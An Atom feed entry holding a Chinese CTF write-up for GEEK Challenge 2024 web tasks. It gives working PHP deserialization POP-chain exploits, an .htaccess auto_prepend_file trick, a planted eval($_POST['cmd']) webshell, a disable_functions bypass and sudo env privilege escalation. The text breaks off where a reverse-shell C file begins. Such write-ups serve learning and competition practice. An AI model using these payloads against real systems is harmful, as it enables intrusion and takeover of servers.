<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>hatchet的个人博客</title>
  
  
  <link href="https://blog.hatchet.top/atom.xml" rel="self"/>
  
  <link href="https://blog.hatchet.top/"/>
  <updated>2024-11-27T05:38:49.000Z</updated>
  <id>https://blog.hatchet.top/</id>
  
  <author>
    <name>hatchet</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>GEEK Challenge2024 Web+Misc+Crypto个人题解WP</title>
    <link href="https://blog.hatchet.top/posts/c264f0a9.html"/>
    <id>https://blog.hatchet.top/posts/c264f0a9.html</id>
    <published>2024-11-15T09:55:59.000Z</published>
    <updated>2024-11-27T05:38:49.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/img/WP/geek2024/%E6%88%90%E7%BB%A9.png" alt=""><br>我是极客大挑战2024第二名队里的web手<br>关注我们队的逆向手谢谢喵 <a href="http://www.czyerror.top">Error 的小破站</a></p><h1 id="Web">Web</h1><h2 id="100-的⚪">100%的⚪</h2><p>js代码搜atob能直接看到base64编码的flag<br><img src="/img/WP/geek2024/sign.png" alt=""></p><h2 id="ezpop">ezpop</h2><p>题目源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">Class SYC&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$starven</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/%|iconv|UCS|UTF|rot|quoted|base|zlib|zip|read/i&#x27;</span>,<span class="variable">$this</span>-&gt;starven))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;no hack&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;starven,<span class="string">&quot;&lt;?php exit();&quot;</span>.<span class="variable">$this</span>-&gt;starven);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class lover&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$J1rry</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$meimeng</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;J1rry)&amp;&amp;<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;J1rry)==<span class="string">&#x27;Welcome GeekChallenge 2024&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;meimeng-&gt;source;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;meimeng;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class Geek&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$GSBP</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$Challenge</span> = <span class="variable language_">$this</span>-&gt;GSBP;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$Challenge</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;GSBP-&gt;<span class="title function_ invoke__">Getflag</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Just do it&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/meimeng/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no hack&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>题目确实出到不会的考点了，反复调用的问题开始无法解决，导致一直空着，解题思路是在做第二个pop链的GC回收时看到的绕过反复调用<br><a href="https://blog.csdn.net/Jayjay___/article/details/130647484?spm=1001.2014.3001.5502">https://blog.csdn.net/Jayjay___/article/details/130647484?spm=1001.2014.3001.5502</a><br><img src="/img/WP/geek2024/%E7%BB%95%E8%BF%87%E5%8F%8D%E5%A4%8D%E8%B0%83%E7%94%A8.png" alt=""><br>绕过方法为多实例化一个对象<br>一般的pop链连接不讲了，最后需要绕过死亡exit命令。<br>屏蔽了二次编码和一些直接写马的可能，好在我们不用RCE，可以不用尖括号<br>写个.htaccess文件，利用 <code>php_value auto_prepend_file &quot;/flag&quot;</code> 直接回显出flag<br>exp如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Class SYC&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$starven</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/%|iconv|UCS|UTF|rot|quoted|base|zlib|zip|read/i&#x27;</span>,<span class="variable">$this</span>-&gt;starven))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;no hack&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;starven,<span class="string">&quot;&lt;?php exit();&quot;</span>.<span class="variable">$this</span>-&gt;starven);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class lover&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$J1rry</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$meimeng</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;J1rry)&amp;&amp;<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;J1rry)==<span class="string">&#x27;Welcome GeekChallenge 2024&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;meimeng-&gt;source;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;meimeng;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class Geek&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$GSBP</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$Challenge</span> = <span class="variable language_">$this</span>-&gt;GSBP;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$Challenge</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;GSBP-&gt;<span class="title function_ invoke__">Getflag</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Just do it&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$S</span>=<span class="keyword">new</span> <span class="title function_ invoke__">SYC</span>();</span><br><span class="line"><span class="variable">$l1</span>=<span class="keyword">new</span> <span class="title function_ invoke__">lover</span>();</span><br><span class="line"><span class="variable">$l2</span>=<span class="keyword">new</span> <span class="title function_ invoke__">lover</span>();</span><br><span class="line"><span class="variable">$G1</span>=<span class="keyword">new</span> <span class="title class_">Geek</span>();</span><br><span class="line"><span class="variable">$G2</span> = <span class="keyword">new</span> <span class="title class_">Geek</span>();</span><br><span class="line"><span class="variable">$l1</span>-&gt;J1rry=<span class="string">&quot;data://text/plain,Welcome GeekChallenge 2024&quot;</span>;</span><br><span class="line"><span class="variable">$l1</span>-&gt;meimeng = <span class="variable">$G1</span>;</span><br><span class="line"><span class="variable">$G1</span>-&gt;GSBP = <span class="variable">$l2</span>;</span><br><span class="line"><span class="variable">$l2</span>-&gt;meimeng = <span class="variable">$G2</span>;</span><br><span class="line"><span class="variable">$G2</span>-&gt;GSBP = <span class="variable">$S</span>;</span><br><span class="line"><span class="comment">#&#x27;/%|iconv|UCS|UTF|rot|quoted|base|zlib|zip|read/i&#x27;</span></span><br><span class="line"><span class="comment"># string.toupper</span></span><br><span class="line"><span class="comment"># string.tolower</span></span><br><span class="line"><span class="comment"># string.strip_tags</span></span><br><span class="line"><span class="variable">$S</span>-&gt;starven=<span class="string">&#x27;php://filter/string.strip_tags/?&gt;php_value auto_prepend_file &quot;/flag&quot;&lt;?/resource=.htaccess&#x27;</span>;</span><br><span class="line"><span class="variable">$exp</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$l1</span>);</span><br><span class="line"><span class="variable">$exp</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;s:7:&quot;meimeng&quot;&#x27;</span>, <span class="string">&#x27;S:7:&quot;m\65imeng&quot;&#x27;</span>, <span class="variable">$exp</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$exp</span>);</span><br></pre></td></tr></table></figure><h2 id="not-just-pop">not_just_pop</h2><p>题目源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;open_basedir&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lhRaMK7</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Do</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$You</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$love</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$web</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我勒个豆，看来你有点实力，那接下来该怎么拿到flag呢？&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;web);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;web=<span class="variable language_">$this</span>-&gt;love;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;You-&gt;execurise=<span class="variable language_">$this</span>-&gt;Do);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Parar</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$execurise</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lead</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hansome</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;lead;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_readable</span>(<span class="string">&quot;/flag&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;还想直接读flag，洗洗睡吧，rce去&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;execurise==<span class="string">&quot;man!&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;居然没坠机&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hansome-&gt;lover))&#123;</span><br><span class="line">                    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="variable language_">$this</span>-&gt;execurise);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;你也想被肘吗&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Starven</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$girl</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$friend</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;试试所想的呗，说不定成功了&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable language_">$this</span>-&gt;girl-&gt;abc;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$args1</span>,<span class="variable">$args2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$func</span>=<span class="variable language_">$this</span>-&gt;friend;</span><br><span class="line">        <span class="variable">$func</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYC</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$lover</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$forever</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;forever-&gt;<span class="title function_ invoke__">nononon</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$Syclover</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;Syclover&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$Syclover</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$Syclover</span>));</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;None&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;怎么不给我呢，是不喜欢吗？&quot;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>throw new Exception是明显的GC回收标志。除了这个就是锻炼serialize基本功的时间了<br><a href="https://blog.csdn.net/Jayjay___/article/details/130647484">https://blog.csdn.net/Jayjay___/article/details/130647484</a><br><img src="/img/WP/geek2024/GC%E5%9B%9E%E6%94%B6.png" alt=""><br>GC回收的利用方法：<br>假设先前你要序列化a对象，改为serialize($a, null)，并把最后的i:1对象破坏，变成i:0, 这样就可以绕过throw new Exception。<br>因为PHP7.3后对private和protect不敏感，所以直接用public就可以<br>exp:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;open_basedir&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lhRaMK7</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Do</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$You</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$love</span>=<span class="string">&#x27;file_put_contents(&quot;shell.php&quot;,&quot;&lt;?=eval(\$_POST[\&#x27;cmd\&#x27;]);?&gt;&quot;);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$web</span>=<span class="string">&#x27;file_put_contents(&quot;shell.php&quot;,&quot;&lt;?=eval(\$_POST[\&#x27;cmd\&#x27;]);?&gt;&quot;);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我勒个豆，看来你有点实力，那接下来该怎么拿到flag呢？&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;web);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;web=<span class="variable language_">$this</span>-&gt;love;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;You-&gt;execurise=<span class="variable language_">$this</span>-&gt;Do); <span class="comment">#=&gt;Parar::__set</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Parar</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$execurise</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lead</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hansome</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;execurise=<span class="string">&quot;man!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;lead; <span class="comment">#=&gt;Starven::__toString</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_readable</span>(<span class="string">&quot;/flag&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;还想直接读flag，洗洗睡吧，rce去&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;execurise==<span class="string">&quot;man!&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;居然没坠机&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hansome-&gt;lover))&#123; <span class="comment">#=&gt;SYC::__isset</span></span><br><span class="line">                    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="variable language_">$this</span>-&gt;execurise);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;你也想被肘吗&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Starven</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$girl</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$friend</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;试试所想的呗，说不定成功了&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable language_">$this</span>-&gt;girl-&gt;abc; <span class="comment">#=&gt;Parar:: __get</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$args1</span>,<span class="variable">$args2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$func</span>=<span class="variable language_">$this</span>-&gt;friend;</span><br><span class="line">        <span class="variable">$func</span>();<span class="comment"># =&gt;lhRaMk7::__invoke</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYC</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$forever</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;forever-&gt;<span class="title function_ invoke__">nononon</span>();<span class="comment"># =&gt;Starven::__call</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$n</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$l1</span> = <span class="keyword">new</span> <span class="title function_ invoke__">lhRaMK7</span>();</span><br><span class="line"><span class="variable">$l2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">lhRaMK7</span>();</span><br><span class="line"><span class="variable">$P1</span> = <span class="keyword">new</span> <span class="title class_">Parar</span>();</span><br><span class="line"><span class="variable">$P2</span> = <span class="keyword">new</span> <span class="title class_">Parar</span>();</span><br><span class="line"><span class="variable">$S1</span> = <span class="keyword">new</span> <span class="title class_">Starven</span>();</span><br><span class="line"><span class="variable">$S2</span> = <span class="keyword">new</span> <span class="title class_">Starven</span>();</span><br><span class="line"><span class="variable">$SYC</span> = <span class="keyword">new</span> <span class="title function_ invoke__">SYC</span>();</span><br><span class="line"><span class="variable">$l1</span>-&gt;You = <span class="variable">$P1</span>; <span class="comment">#=&gt;Parar::__set</span></span><br><span class="line"><span class="variable">$P1</span>-&gt;lead = <span class="variable">$S1</span>; <span class="comment">#=&gt;Starven::__toString</span></span><br><span class="line"><span class="variable">$S1</span>-&gt;girl = <span class="variable">$P2</span>; <span class="comment">#=&gt;Parar:: __get</span></span><br><span class="line"><span class="variable">$P2</span>-&gt;hansome = <span class="variable">$SYC</span>; <span class="comment">#=&gt;SYC::__isset</span></span><br><span class="line"><span class="variable">$SYC</span>-&gt;forever = <span class="variable">$S2</span>; <span class="comment">#=&gt;Starven::__call</span></span><br><span class="line"><span class="variable">$S2</span>-&gt;friend = <span class="variable">$l2</span>; <span class="comment">#=&gt;lhRaMk7::__invoke</span></span><br><span class="line"><span class="variable">$Syclover</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>(<span class="variable">$l1</span>,<span class="variable">$n</span>));</span><br><span class="line"><span class="variable">$Syclover</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;i:1;N;&#125;&quot;</span>, <span class="string">&quot;i:0;N;&#125;&quot;</span>, <span class="variable">$Syclover</span>);</span><br><span class="line"><span class="comment">// $Syclover=str_replace(&quot;O:7&quot;, &quot;O:8&quot;, $Syclover);</span></span><br><span class="line"><span class="comment">// $Syclover=str_replace(&#x27;s:17:&#x27;, &#x27;s:16:&#x27;, $Syclover);</span></span><br><span class="line"><span class="comment">// $Syclover = rtrim($Syclover, &#x27;&#125;&#x27;);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$Syclover</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$Syclover</span>);</span><br><span class="line"><span class="comment">// $Syclover=$_GET[&#x27;Syclover&#x27;];</span></span><br><span class="line"><span class="comment">// if (isset($Syclover)) &#123;</span></span><br><span class="line"><span class="comment">//     unserialize(base64_decode($Syclover));</span></span><br><span class="line"><span class="comment">//     throw new Exception(&quot;None&quot;);</span></span><br><span class="line"><span class="comment">// &#125;else&#123;</span></span><br><span class="line"><span class="comment">//     echo(&quot;怎么不给我呢，是不喜欢吗？&quot;);</span></span><br><span class="line"><span class="comment">// &#125; </span></span><br></pre></td></tr></table></figure><p><img src="/img/WP/geek2024/ret%20127.png" alt=""><br>蚁剑连上shell发现ret 127，说明存在disable_functions<br>在蚁剑市场下载php_disable_functions绕过插件<br>利用其中的PHP7_UserFilter绕过<br><img src="/img/WP/geek2024/bypass.png" alt=""><br>发现/flag需要root权限，尝试SUID提权</p><pre><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></pre><p><img src="/img/WP/geek2024/find_result.png" alt=""><br>没找到有用的</p><pre><code>sudo -l</code></pre><p><img src="/img/WP/geek2024/sudo_result.png" alt=""></p><p>env 可以直接获取root权限 <a href="https://gtfobins.github.io/#env">https://gtfobins.github.io/#env</a></p><pre><code>sudo env /bin/sh</code></pre><p>蚁剑的shell不大行，切到自己的vps上提权<br>先写个反弹shell <a href="https://www.revshells.com/">https://www.revshells.com/</a><br>exp.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span 